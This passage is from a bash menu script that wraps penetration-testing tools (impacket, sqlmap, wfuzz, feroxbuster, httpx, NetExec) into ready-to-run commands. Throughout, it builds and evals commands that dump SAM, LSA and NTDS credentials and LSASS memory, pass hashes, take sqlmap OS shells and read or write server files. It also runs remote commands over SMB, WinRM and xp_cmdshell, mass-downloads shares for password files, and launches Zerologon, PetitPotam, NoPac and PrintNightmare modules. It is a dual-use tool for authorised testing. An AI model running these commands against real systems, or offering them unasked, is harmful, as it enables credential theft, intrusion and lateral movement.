            echo "Dump All (SAM+LSA+NTDS)
Dump SAM Only
Dump LSA Secrets Only
Dump NTDS (Domain Controller)
Dump with Specific Hashes
Dump from Offline Files" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "impacket_kerberoast")
            echo "Kerberoast All SPNs
Kerberoast Specific User
Request TGS for All Users
Output to Hashcat Format
Output to John Format" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "impacket_asreproast")
            echo "AS-REP Roast All Users
AS-REP Roast from User List
Output to Hashcat Format
Output to John Format
Check Specific User" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "impacket_tickets")
            echo "Create Golden Ticket
Create Silver Ticket
Request TGT
Export Ticket (ccache)
Import Ticket" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "impacket_enum")
            echo "Enumerate Users (GetADUsers)
SID Lookup (lookupsid)
RPC Endpoints (rpcdump)
SAM Dump (samrdump)
List Shares (smbclient)
Get Domain Info" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "impacket_smbclient")
            echo "Interactive SMB Client
List Shares
Download File
Upload File
Execute Command via SMB" | fzf --prompt="$prompt" --height=40% --reverse --header="$header"
            ;;
        "impacket_services")
            echo "List Services
Start Service
Stop Service
Create Service
Delete Service
Query Service Status" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
        "impacket_registry")
            echo "Query Registry Key
Read Registry Value
Write Registry Value
Backup Registry Hive
Save SAM Hive
Save SYSTEM Hive" | fzf --prompt="$prompt" --height=50% --reverse --header="$header"
            ;;
    esac
}

# Execute command with preview
run_command() {
    local cmd=$1
    echo -e "\n${YELLOW}[>] Command Preview:${NC}"
    echo -e "${CYAN}$cmd${NC}\n"
    
    read -p "Press Enter to execute, 'e' to edit, or Ctrl+C to cancel: " choice
    
    if [[ "$choice" == "e" || "$choice" == "E" ]]; then
        read -e -i "$cmd" -p "Edit: " edited_cmd
        cmd="$edited_cmd"
        echo ""
    fi
    
    echo -e "${GREEN}[*] Executing...${NC}\n"
    eval "$cmd"
    
    echo -e "\n${GREEN}[✓] Done!${NC}"
    read -p "Press Enter to continue..."
}

# Main menu loop
main_menu() {
    while true; do
        clear

        # Capture both key press and selection from fzf --expect
        local output=$(show_menu "main" "Select Category: ")
        local key=$(echo "$output" | head -n1)
        local choice=$(echo "$output" | tail -n1)

        # Handle keybind shortcuts first
        case "$key" in
            "t")
                manage_targets
                continue
                ;;
            "c")
                manage_credentials
                continue
                ;;
            "w")
                manage_web_targets
                continue
                ;;
            "d")
                manage_ad_targets
                continue
                ;;
            "a")
                select_credentials
                continue
                ;;
            "s")
                select_target
                continue
                ;;
            "m")
                toggle_run_mode
                continue
                ;;
        esac

        # Handle menu selections
        case "$choice" in
            "Exit"|"")
                exit 0
                ;;
            "Switch Credentials")
                select_credentials
                continue
                ;;
            "Switch Target")
                select_target
                continue
                ;;
            "Toggle Run Mode (Single/All)")
                toggle_run_mode
                continue
                ;;
            "Manage Credentials")
                manage_credentials
                continue
                ;;
            "Manage Targets")
                manage_targets
                continue
                ;;
            "Manage Web Targets")
                manage_web_targets
                continue
                ;;
            "Manage AD Targets")
                manage_ad_targets
                continue
                ;;
            "Select AD Target")
                select_ad_target
                continue
                ;;

            # ===== WEB TESTING TOOLS =====
            
            "Feroxbuster (Directory/File Discovery)")
                while true; do
                    subchoice=$(show_menu "feroxbuster" "Select Feroxbuster Operation: ")
                    [[ -z "$subchoice" || "$subchoice" == "Back" ]] && break
                    
                    url=$(get_web_target_url)
                    if [[ -z "$url" ]]; then
                        echo -e "${RED}No URL provided!${NC}"
                        sleep 2
                        continue
                    fi
                    
                    case "$subchoice" in
                        "Basic Directory Scan")
                            echo -e "${CYAN}Running basic scan with thorough mode${NC}"
                            run_command "feroxbuster -u '$url' --thorough --methods GET,POST"
                            ;;
                        "Deep Scan with Extensions")
                            read -p "Extensions (e.g., php,html,js,txt) [default: php,html,js,txt,asp,aspx,jsp]: " exts
                            [[ -z "$exts" ]] && exts="php,html,js,txt,asp,aspx,jsp"
                            echo -e "${CYAN}Deep scan with extensions: $exts${NC}"
                            run_command "feroxbuster -u '$url' --thorough --methods GET,POST -x '$exts' -t 50"
                            ;;
                        "Custom Wordlist Scan")
                            read -p "Wordlist path: " wordlist
                            if [[ ! -f "$wordlist" ]]; then
                                echo -e "${RED}Wordlist not found!${NC}"
                                sleep 2
                                continue
                            fi
                            run_command "feroxbuster -u '$url' --thorough --methods GET,POST -w '$wordlist'"
                            ;;
                        "Burp Integration Scan")
                            read -p "Burp proxy [default: 127.0.0.1:8080]: " proxy
                            [[ -z "$proxy" ]] && proxy="127.0.0.1:8080"
                            echo -e "${CYAN}Scanning with Burp integration${NC}"
                            echo -e "${YELLOW}Make sure Burp is running and listening!${NC}"
                            run_command "feroxbuster -u '$url' --thorough --methods GET,POST --burp --burp-replay -p 'http://$proxy'"
                            ;;
                        "API Discovery")
                            echo -e "${CYAN}Scanning for API endpoints${NC}"
                            run_command "feroxbuster -u '$url' --thorough --methods GET,POST,PUT,DELETE,PATCH -x json,xml"
                            ;;
                        "Backup File Discovery")
                            echo -e "${CYAN}Scanning for backup files${NC}"
                            run_command "feroxbuster -u '$url' --thorough -x bak,old,backup,zip,tar,gz,sql,db,config"
                            ;;
                        "Custom Scan")
                            read -p "Additional feroxbuster flags: " custom_flags
                            run_command "feroxbuster -u '$url' --thorough --methods GET,POST $custom_flags"
                            ;;
                    esac
                done
                ;;
            
            "WFUZZ (Fuzzing)")
                while true; do
                    subchoice=$(show_menu "wfuzz" "Select WFUZZ Operation: ")
                    [[ -z "$subchoice" || "$subchoice" == "Back" ]] && break
                    
                    case "$subchoice" in
                        "VHOST Fuzzing")
                            read -p "Target IP: " target_ip
                            read -p "Base domain (e.g., example.com): " domain
                            read -p "Wordlist [default: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt]: " wordlist
                            [[ -z "$wordlist" ]] && wordlist="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
                            
                            if [[ ! -f "$wordlist" ]]; then
                                echo -e "${RED}Wordlist not found!${NC}"
                                sleep 2
                                continue
                            fi
                            
                            echo -e "${CYAN}Fuzzing VHOSTs for $domain on $target_ip${NC}"
                            run_command "wfuzz -c -w '$wordlist' -H 'Host: FUZZ.$domain' --hc 404 --hw 0 http://$target_ip/"
                            ;;
                        "Parameter Fuzzing (GET)")
                            read -p "Base URL (with FUZZ, e.g., http://example.com/page?FUZZ=test): " url
                            read -p "Wordlist [default: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt]: " wordlist
                            [[ -z "$wordlist" ]] && wordlist="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
                            
                            echo -e "${CYAN}Fuzzing GET parameters${NC}"
                            run_command "wfuzz -c -w '$wordlist' --hc 404 '$url'"
                            ;;
                        "Parameter Fuzzing (POST)")
                            read -p "Target URL: " url
                            read -p "POST data (use FUZZ, e.g., username=admin&FUZZ=test): " postdata
                            read -p "Wordlist [default: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt]: " wordlist
                            [[ -z "$wordlist" ]] && wordlist="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
                            
                            echo -e "${CYAN}Fuzzing POST parameters${NC}"
                            run_command "wfuzz -c -w '$wordlist' --hc 404 -d '$postdata' '$url'"
                            ;;
                        "DNS Subdomain Fuzzing")
                            read -p "Domain (e.g., example.com): " domain
                            read -p "Wordlist [default: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt]: " wordlist
                            [[ -z "$wordlist" ]] && wordlist="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
                            
                            echo -e "${CYAN}Fuzzing DNS subdomains for $domain${NC}"
                            run_command "wfuzz -c -w '$wordlist' -Z --hc 404 -H 'Host: FUZZ.$domain' http://$domain/"
                            ;;
                        "Directory Fuzzing")
                            read -p "Base URL: " url
                            read -p "Wordlist [default: /usr/share/seclists/Discovery/Web-Content/common.txt]: " wordlist
                            [[ -z "$wordlist" ]] && wordlist="/usr/share/seclists/Discovery/Web-Content/common.txt"
                            
                            echo -e "${CYAN}Fuzzing directories${NC}"
                            run_command "wfuzz -c -w '$wordlist' --hc 404 '$url/FUZZ'"
                            ;;
                        "Header Fuzzing")
                            read -p "Target URL: " url
                            read -p "Header name (e.g., X-Forwarded-For): " header
                            read -p "Wordlist for values: " wordlist
                            
                            echo -e "${CYAN}Fuzzing HTTP headers${NC}"
                            run_command "wfuzz -c -w '$wordlist' --hc 404 -H '$header: FUZZ' '$url'"
                            ;;
                        "Custom Fuzzing")
                            read -p "Full wfuzz command (without 'wfuzz'): " custom_cmd
                            run_command "wfuzz $custom_cmd"
                            ;;
                    esac
                done
                ;;
            
            "SQLMap (SQL Injection)")
                while true; do
                    subchoice=$(show_menu "sqlmap" "Select SQLMap Operation: ")
                    [[ -z "$subchoice" || "$subchoice" == "Back" ]] && break
                    
                    case "$subchoice" in
                        "Basic SQL Injection Scan")
                            read -p "Target URL (e.g., http://example.com/page?id=1): " url
                            echo -e "${CYAN}Running basic SQL injection scan${NC}"
                            echo -e "${GREEN}Using defaults: --batch --random-agent --tamper=space2comment${NC}"
                            run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --level=1 --risk=1"
                            ;;
                        "POST Data Injection")
                            read -p "Target URL: " url
                            read -p "POST data (e.g., username=admin&password=pass): " postdata
                            echo -e "${CYAN}Testing POST parameters for SQL injection${NC}"
                            run_command "sqlmap -u '$url' --data='$postdata' --batch --random-agent --tamper=space2comment"
                            ;;
                        "Cookie-based Injection")
                            read -p "Target URL: " url
                            read -p "Cookie string (e.g., session=abc123; user=admin): " cookie
                            echo -e "${CYAN}Testing cookie for SQL injection${NC}"
                            run_command "sqlmap -u '$url' --cookie='$cookie' --batch --random-agent --tamper=space2comment --level=2"
                            ;;
                        "Custom Headers Injection")
                            read -p "Target URL: " url
                            read -p "Header (e.g., X-Forwarded-For: 127.0.0.1): " header
                            echo -e "${CYAN}Testing custom header for SQL injection${NC}"
                            run_command "sqlmap -u '$url' --headers='$header' --batch --random-agent --tamper=space2comment"
                            ;;
                        "Dump Current Database")
                            read -p "Target URL: " url
                            echo -e "${CYAN}Dumping current database${NC}"
                            run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --current-db --dump"
                            ;;
                        "Dump All Databases")
                            read -p "Target URL: " url
                            echo -e "${CYAN}Dumping all databases${NC}"
                            echo -e "${YELLOW}Warning: This may take a while!${NC}"
                            read -p "Continue? (y/n): " confirm
                            if [[ "$confirm" == "y" ]]; then
                                run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --all --dump-all"
                            fi
                            ;;
                        "Get OS Shell")
                            read -p "Target URL: " url
                            echo -e "${CYAN}Attempting to get OS shell${NC}"
                            echo -e "${YELLOW}Requires stacked queries support${NC}"
                            run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --os-shell"
                            ;;
                        "Read File from Server")
                            read -p "Target URL: " url
                            read -p "File to read (e.g., /etc/passwd): " file
                            echo -e "${CYAN}Reading file from server${NC}"
                            run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --file-read='$file'"
                            ;;
                        "Write File to Server")
                            read -p "Target URL: " url
                            read -p "Local file to upload: " local_file
                            read -p "Remote destination path: " remote_path
                            echo -e "${CYAN}Writing file to server${NC}"
                            run_command "sqlmap -u '$url' --batch --random-agent --tamper=space2comment --file-write='$local_file' --file-dest='$remote_path'"
                            ;;
                        "Custom Scan")
                            read -p "Full sqlmap command (without 'sqlmap'): " custom_cmd
                            run_command "sqlmap $custom_cmd"
                            ;;
                    esac
                done
                ;;
            
            "HTTPX (HTTP Probing)")
                while true; do
                    subchoice=$(show_menu "httpx" "Select HTTPX Operation: ")
                    [[ -z "$subchoice" || "$subchoice" == "Back" ]] && break
                    
                    case "$subchoice" in
                        "Probe Single URL")
                            read -p "URL to probe: " url
                            echo -e "${CYAN}Probing single URL${NC}"
                            run_command "httpx -u '$url' -status-code -title -tech-detect -follow-redirects"
                            ;;
                        "Probe from URL List")
                            read -p "File containing URLs: " urlfile
                            if [[ ! -f "$urlfile" ]]; then
                                echo -e "${RED}File not found!${NC}"
                                sleep 2
                                continue
                            fi
                            echo -e "${CYAN}Probing URLs from file${NC}"
                            run_command "httpx -l '$urlfile' -status-code -title -tech-detect"
                            ;;
                        "Probe from Nmap IPs")
                            read -p "File with IP addresses (one per line): " ipfile
                            if [[ ! -f "$ipfile" ]]; then
                                echo -e "${RED}File not found!${NC}"
                                sleep 2
                                continue
                            fi
                            read -p "Ports to check [default: 80,443,8000,8080,8443]: " ports
                            [[ -z "$ports" ]] && ports="80,443,8000,8080,8443"
                            
                            echo -e "${CYAN}Discovering web servers from nmap IPs${NC}"
                            run_command "cat '$ipfile' | httpx -ports '$ports' -status-code -title -tech-detect -follow-redirects"
                            ;;
                        "Extract Page Titles")
                            read -p "URL or file with URLs: " input
                            if [[ -f "$input" ]]; then
                                echo -e "${CYAN}Extracting titles from URL file${NC}"
                                run_command "httpx -l '$input' -title -silent"
                            else
                                echo -e "${CYAN}Extracting title from single URL${NC}"
                                run_command "httpx -u '$input' -title"
                            fi
                            ;;
                        "Technology Detection")
                            read -p "URL or file with URLs: " input
                            if [[ -f "$input" ]]; then
                                echo -e "${CYAN}Detecting technologies from URL file${NC}"
                                run_command "httpx -l '$input' -tech-detect -status-code"
                            else
                                echo -e "${CYAN}Detecting technologies from single URL${NC}"
                                run_command "httpx -u '$input' -tech-detect -status-code"
                            fi
                            ;;
                        "Full Discovery Scan")
                            read -p "File with URLs/IPs: " input
                            read -p "Output file [default: httpx-results.txt]: " output
                            [[ -z "$output" ]] && output="httpx-results.txt"
                            
                            echo -e "${CYAN}Running full discovery scan${NC}"
                            echo -e "${GREEN}Results will be saved to: $output${NC}"
                            run_command "httpx -l '$input' -status-code -title -tech-detect -web-server -content-type -content-length -follow-redirects -json -o '$output'"
                            ;;
                        "Screenshot Websites")
                            read -p "URL or file with URLs: " input
                            read -p "Screenshot directory [default: ./screenshots]: " outdir
                            [[ -z "$outdir" ]] && outdir="./screenshots"
                            
                            echo -e "${CYAN}Taking screenshots${NC}"
                            echo -e "${YELLOW}Requires Chrome/Chromium to be installed${NC}"
                            
                            if [[ -f "$input" ]]; then
                                run_command "httpx -l '$input' -screenshot -screenshot-path '$outdir'"
                            else
                                run_command "httpx -u '$input' -screenshot -screenshot-path '$outdir'"
                            fi
                            ;;
                        "Custom Probe")
                            read -p "Full httpx command (without 'httpx'): " custom_cmd
                            run_command "httpx $custom_cmd"
                            ;;
                    esac
                done
                ;;
            
            # ===== NETWORK TESTING TOOLS (NXC) =====
            
            "SMB Authentication")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "smb_auth" "Select Auth Method: ")
                case "$subchoice" in
                    "Test Authentication")
                        run_command "nxc smb $target $auth"
                        ;;
                    "Test with Domain")
                        domain=${DOMAIN:-WORKGROUP}
                        run_command "nxc smb $target $auth -d $domain"
                        ;;
                    "Pass-the-Hash")
                        read -p "NTLM Hash: " hash
                        run_command "nxc smb $target -u $USERNAME -H $hash"
                        ;;
                    "Local Authentication")
                        run_command "nxc smb $target $auth --local-auth"
                        ;;
                esac
                ;;
            "SMB Enumeration")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "smb_enum" "Select Enumeration: ")
                case "$subchoice" in
                    "List Shares")
                        run_command "nxc smb $target $auth --shares"
                        ;;
                    "Enumerate Users")
                        run_command "nxc smb $target $auth --users"
                        ;;
                    "Enumerate Local Users")
                        run_command "nxc smb $target $auth --local-users"
                        ;;
                    "Enumerate Groups")
                        run_command "nxc smb $target $auth --groups"
                        ;;
                    "Password Policy")
                        run_command "nxc smb $target $auth --pass-pol"
                        ;;
                    "Active Sessions")
                        run_command "nxc smb $target $auth --sessions"
                        ;;
                    "Logged On Users")
                        run_command "nxc smb $target $auth --loggedon-users"
                        ;;
                    "RID Bruteforce")
                        run_command "nxc smb $target $auth --rid-brute"
                        ;;
                    "List Disks")
                        run_command "nxc smb $target $auth --disks"
                        ;;
                    "Full Enumeration (All)")
                        run_command "nxc smb $target $auth --users --groups --shares --sessions --pass-pol --disks"
                        ;;
                esac
                ;;
            "SMB Shares")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "smb_shares" "Select Share Operation: ")
                case "$subchoice" in
                    "Browse & Download Files (Interactive)")
                        if [[ "$RUN_MODE" == "all" ]]; then
                            echo -e "${YELLOW}Interactive browse only works with single target.${NC}"
                            sleep 2
                            continue
                        fi
                        echo -e "${CYAN}This will spider shares and list all files, then download them.${NC}"
                        read -p "Limit to specific share? (leave empty for all shares): " share_opt
                        read -p "File pattern to match? (e.g., *.xlsx, *.txt, or leave empty for all): " pattern_opt
                        
                        cmd="nxc smb $target $auth -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=512000"
                        [[ -n "$share_opt" ]] && cmd="$cmd SHARE='$share_opt'"
                        [[ -n "$pattern_opt" ]] && cmd="$cmd PATTERN='$pattern_opt'"
                        
                        echo -e "\n${GREEN}Files will be downloaded to: ~/.nxc/modules/nxc_spider_plus/${NC}\n"
                        
                        run_command "$cmd"
                        
                        echo -e "\n${CYAN}Would you like to view the downloaded files?${NC}"
                        read -p "Show downloaded files? (y/n): " show_files
                        if [[ "$show_files" == "y" || "$show_files" == "Y" ]]; then
                            # Check the primary location first
                            if [[ -d ~/.nxc/modules/nxc_spider_plus ]]; then
                                echo -e "\n${GREEN}Files in ~/.nxc/modules/nxc_spider_plus:${NC}"
                                ls -lhR ~/.nxc/modules/nxc_spider_plus 2>/dev/null | tail -50
                            else
                                # Fall back to checking other locations
                                show_downloads
                            fi
                            read -p "Press Enter to continue..."
                        fi
                        ;;
                    "Download All Files (Recursive)")
                        echo -e "${CYAN}This will recursively download ALL files from all shares!${NC}"
                        echo -e "${YELLOW}Warning: This may take a while and use disk space.${NC}"
                        read -p "Continue? (y/n): " confirm
                        if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
                            continue
                        fi
                        
                        echo -e "\n${GREEN}Files will be downloaded to: ~/.nxc/modules/nxc_spider_plus/${NC}\n"
                        run_command "nxc smb $target $auth -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=512000"
                        
                        echo -e "\n${CYAN}Download complete!${NC}"
                        read -p "Open download directory? (y/n): " open_dir
                        if [[ "$open_dir" == "y" || "$open_dir" == "Y" ]]; then
                            if [[ -d ~/.nxc/modules/nxc_spider_plus ]]; then
                                echo -e "\n${GREEN}Files in ~/.nxc/modules/nxc_spider_plus:${NC}"
                                ls -lhR ~/.nxc/modules/nxc_spider_plus 2>/dev/null | tail -50
                            else
                                show_downloads
                            fi
                            read -p "Press Enter to continue..."
                        fi
                        ;;
                    "Download Files by Pattern")
                        echo -e "${CYAN}Download only files matching a pattern${NC}"
                        echo -e "${CYAN}Examples: *.xlsx, *.docx, *password*, *cred*${NC}"
                        read -p "File pattern: " pattern
                        
                        if [[ -z "$pattern" ]]; then
                            echo -e "${RED}Pattern cannot be empty!${NC}"
                            sleep 2
                            continue
                        fi
                        
                        echo -e "\n${GREEN}Downloading files matching: $pattern${NC}"
                        echo -e "${GREEN}Files will be saved to: ~/.nxc/modules/nxc_spider_plus/${NC}\n"
                        
                        run_command "nxc smb $target $auth -M spider_plus -o DOWNLOAD_FLAG=True PATTERN='$pattern' MAX_FILE_SIZE=512000"
                        
                        echo -e "\n${CYAN}Files matching '$pattern' have been downloaded!${NC}"
                        read -p "View downloaded files? (y/n): " view
                        if [[ "$view" == "y" || "$view" == "Y" ]]; then
                            echo -e "\n${GREEN}Searching for downloaded files matching pattern...${NC}"
                            if [[ -d ~/.nxc/modules/nxc_spider_plus ]]; then
                                echo -e "\n${GREEN}Files in ~/.nxc/modules/nxc_spider_plus:${NC}"
                                find ~/.nxc/modules/nxc_spider_plus -type f 2>/dev/null | while read f; do ls -lh "$f"; done | tail -30
                            else
                                show_downloads
                            fi
                            read -p "Press Enter to continue..."
                        fi
                        ;;
                    "Spider & List Only (No Download)")
                        echo -e "${CYAN}This will list all files without downloading them${NC}"
                        read -p "Limit to specific share? (leave empty for all): " share_opt
                        read -p "File pattern? (leave empty for all): " pattern_opt
                        
                        cmd="nxc smb $target $auth -M spider_plus"
                        [[ -n "$share_opt" ]] && cmd="$cmd -o SHARE='$share_opt'"
                        [[ -n "$pattern_opt" ]] && cmd="$cmd -o PATTERN='$pattern_opt'"
                        
                        echo -e "\n${GREEN}File list will be saved to: ~/.nxc/modules/nxc_spider_plus/${NC}\n"
                        
                        run_command "$cmd"
                        
                        echo -e "\n${CYAN}Would you like to view the file list?${NC}"
                        read -p "Show JSON file list? (y/n): " show_json
                        if [[ "$show_json" == "y" || "$show_json" == "Y" ]]; then
                            # Try to find the JSON file
                            json_file=$(find ~/.nxc/modules/nxc_spider_plus -name "*.json" -type f 2>/dev/null | head -1)
                            
                            if [[ -z "$json_file" ]]; then
                                # Fall back to other locations
                                for dir in ~/.nxc/logs /tmp/nxc_hosted/nxc_spider_plus /tmp/nxc; do
                                    if [[ -d "$dir" ]]; then
                                        json_file=$(find "$dir" -name "*.json" -type f 2>/dev/null | grep -i spider | head -1)
                                        [[ -n "$json_file" ]] && break
                                    fi
                                done
                            fi
                            
                            if [[ -n "$json_file" ]]; then
                                echo -e "\n${GREEN}File: $json_file${NC}\n"
                                cat "$json_file" | jq . 2>/dev/null || cat "$json_file"
                            else
                                echo -e "${YELLOW}JSON file not found. Check:${NC}"
                                echo -e "  ~/.nxc/modules/nxc_spider_plus/"
                            fi
                            read -p "Press Enter to continue..."
                        fi
                        ;;
                    "Spider Specific Share")
                        read -p "Share name: " share
                        if [[ -z "$share" ]]; then
                            echo -e "${RED}Share name cannot be empty!${NC}"
                            sleep 2
                            continue
                        fi
                        
                        echo -e "\n${CYAN}Choose action:${NC}"
                        action=$(echo "List files only
Download all files in share" | fzf --prompt="Select: " --height=30% --reverse)
                        
                        case "$action" in
                            "List files only")
                                run_command "nxc smb $target $auth -M spider_plus -o SHARE='$share'"
                                ;;
                            "Download all files in share")
                                echo -e "\n${GREEN}Downloading all files from share: $share${NC}\n"
                                run_command "nxc smb $target $auth -M spider_plus -o SHARE='$share' DOWNLOAD_FLAG=True MAX_FILE_SIZE=512000"
                                ;;
                        esac
                        ;;
                    "Download Specific File (Manual Path)")
                        if [[ "$RUN_MODE" == "all" ]]; then
                            echo -e "${YELLOW}Manual download only works with single target.${NC}"
                            sleep 2
                            continue
                        fi
                        echo -e "${CYAN}Remote path must use Windows format with double backslashes${NC}"
                        echo -e "${CYAN}Example: \\\\Windows\\\\Temp\\\\passwords.txt${NC}"
                        read -p "Remote path: " remote
                        read -p "Local path (where to save): " local
                        run_command "nxc smb $target $auth --get-file '$remote' '$local'"
                        ;;
                    "Upload File")
                        if [[ "$RUN_MODE" == "all" ]]; then
                            echo -e "${YELLOW}Upload only works with single target.${NC}"
                            sleep 2
                            continue
                        fi
                        read -p "Local path (file to upload): " local
                        echo -e "${CYAN}Remote path must use Windows format with double backslashes${NC}"
                        echo -e "${CYAN}Example: \\\\Windows\\\\Temp\\\\file.txt${NC}"
                        read -p "Remote path: " remote
                        run_command "nxc smb $target $auth --put-file '$local' '$remote'"
                        ;;
                esac
                ;;
            "SMB Execution")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "smb_exec" "Select Command: ")
                case "$subchoice" in
                    "Execute Command (CMD)")
                        read -p "Command: " cmd
                        run_command "nxc smb $target $auth -x '$cmd'"
                        ;;
                    "Execute PowerShell")
                        read -p "PowerShell command: " ps
                        run_command "nxc smb $target $auth -X '$ps'"
                        ;;
                    "Get System Info")
                        run_command "nxc smb $target $auth -x systeminfo"
                        ;;
                    "List Processes")
                        run_command "nxc smb $target $auth -x 'tasklist /v'"
                        ;;
                    "Network Configuration")
                        run_command "nxc smb $target $auth -x 'ipconfig /all'"
                        ;;
                    "List Administrators")
                        run_command "nxc smb $target $auth -x 'net localgroup administrators'"
                        ;;
                    "Check Privileges")
                        run_command "nxc smb $target $auth -x 'whoami /priv'"
                        ;;
                esac
                ;;
            "SMB Credentials")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "smb_creds" "Select Dump Method: ")
                case "$subchoice" in
                    "Dump SAM Database")
                        run_command "nxc smb $target $auth --sam"
                        ;;
                    "Dump LSA Secrets")
                        run_command "nxc smb $target $auth --lsa"
                        ;;
                    "Dump NTDS (Domain Controller)")
                        run_command "nxc smb $target $auth --ntds"
                        ;;
                    "Dump All (SAM+LSA+NTDS)")
                        run_command "nxc smb $target $auth --sam --lsa --ntds"
                        ;;
                    "Lsassy (Memory Dump)")
                        run_command "nxc smb $target $auth -M lsassy"
                        ;;
                    "Nanodump")
                        run_command "nxc smb $target $auth -M nanodump"
                        ;;
                    "WiFi Passwords")
                        run_command "nxc smb $target $auth -M wifi"
                        ;;
                esac
                ;;
            "SMB Vulnerabilities")
                target=$(get_target_for_command) || continue
                auth=$(build_auth)
                subchoice=$(show_menu "smb_vulns" "Select Vulnerability: ")
                case "$subchoice" in
                    "MS17-010 (EternalBlue)")
                        run_command "nxc smb $target -M ms17-010"
                        ;;
                    "Zerologon (CVE-2020-1472)")
                        run_command "nxc smb $target $auth -M zerologon"
                        ;;
                    "PetitPotam")
                        run_command "nxc smb $target $auth -M petitpotam"
                        ;;
                    "NoPac (CVE-2021-42278)")
                        run_command "nxc smb $target $auth -M nopac"
                        ;;
                    "SMBGhost (CVE-2020-0796)")
                        run_command "nxc smb $target -M smbghost"
                        ;;
                    "PrintNightmare")
                        run_command "nxc smb $target $auth -M printnightmare"
                        ;;
                    "All Vulnerability Checks")
                        run_command "nxc smb $target -M ms17-010 && nxc smb $target $auth -M zerologon && nxc smb $target $auth -M petitpotam && nxc smb $target $auth -M nopac"
                        ;;
                esac
                ;;
            "LDAP Enumeration")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                domain=${DOMAIN:-WORKGROUP}
                subchoice=$(show_menu "ldap" "Select LDAP Operation: ")
                case "$subchoice" in
                    "Enumerate Users")
                        run_command "nxc ldap $target $auth -d $domain --users"
                        ;;
                    "Enumerate Groups")
                        run_command "nxc ldap $target $auth -d $domain --groups"
                        ;;
                    "Get User Descriptions")
                        run_command "nxc ldap $target $auth -d $domain -M get-desc-users"
                        ;;
                    "Enumerate Computers")
                        run_command "nxc ldap $target $auth -d $domain -M machines"
                        ;;
                    "Enumerate Domain Trusts")
                        run_command "nxc ldap $target $auth -d $domain -M enum_trusts"
                        ;;
                    "ADCS Enumeration")
                        run_command "nxc ldap $target $auth -d $domain -M adcs"
                        ;;
                    "Check LDAP Signing")
                        run_command "nxc ldap $target $auth -d $domain -M ldap-checker"
                        ;;
                    "Get All User Attributes")
                        run_command "nxc ldap $target $auth -d $domain -M user-desc"
                        ;;
                esac
                ;;
            "LDAP BloodHound")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                domain=${DOMAIN:-WORKGROUP}
                subchoice=$(show_menu "bloodhound" "Select Collection: ")
                case "$subchoice" in
                    "Collect All")
                        run_command "nxc ldap $target $auth -d $domain -M bloodhound -o COLLECTION=All"
                        ;;
                    "Collect Sessions")
                        run_command "nxc ldap $target $auth -d $domain -M bloodhound -o COLLECTION=Session"
                        ;;
                    "Collect Trusts")
                        run_command "nxc ldap $target $auth -d $domain -M bloodhound -o COLLECTION=Trusts"
                        ;;
                    "Collect ACL")
                        run_command "nxc ldap $target $auth -d $domain -M bloodhound -o COLLECTION=ACL"
                        ;;
                    "Collect Groups")
                        run_command "nxc ldap $target $auth -d $domain -M bloodhound -o COLLECTION=Group"
                        ;;
                esac
                ;;
            "WinRM Operations")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "winrm" "Select WinRM Operation: ")
                case "$subchoice" in
                    "Test Authentication")
                        run_command "nxc winrm $target $auth"
                        ;;
                    "Execute Command")
                        read -p "Command: " cmd
                        run_command "nxc winrm $target $auth -x '$cmd'"
                        ;;
                    "Execute PowerShell")
                        read -p "PowerShell command: " ps
                        run_command "nxc winrm $target $auth -X '$ps'"
                        ;;
                    "Get System Info")
                        run_command "nxc winrm $target $auth -x systeminfo"
                        ;;
                    "Check Privileges")
                        run_command "nxc winrm $target $auth -x 'whoami /priv'"
                        ;;
                    "List Local Users")
                        run_command "nxc winrm $target $auth -x 'net user'"
                        ;;
                    "Network Configuration")
                        run_command "nxc winrm $target $auth -x 'ipconfig /all'"
                        ;;
                esac
                ;;
            "MSSQL Operations")
                auth=$(build_auth)
                target=$(get_target_for_command) || continue
                subchoice=$(show_menu "mssql" "Select MSSQL Operation: ")
                case "$subchoice" in
                    "Test Authentication")
                        run_command "nxc mssql $target $auth"
                        ;;
                    "Get MSSQL Version")
                        run_command "nxc mssql $target $auth -q 'SELECT @@version'"
                        ;;
                    "List Databases")
                        run_command "nxc mssql $target $auth -q 'SELECT name FROM sys.databases'"
                        ;;
                    "List Tables")
                        read -p "Database name: " db
                        run_command "nxc mssql $target $auth -q 'SELECT * FROM ${db}.INFORMATION_SCHEMA.TABLES'"
                        ;;
                    "Check Privileges")
                        run_command "nxc mssql $target $auth -M mssql_priv"
                        ;;
                    "Execute Command (xp_cmdshell)")
                        read -p "Command: " cmd
                        run_command "nxc mssql $target $auth -x '$cmd'"
                        ;;
                    "Enable xp_cmdshell")
                        run_command "nxc mssql $target $auth -q \"EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\""
                        ;;
                esac
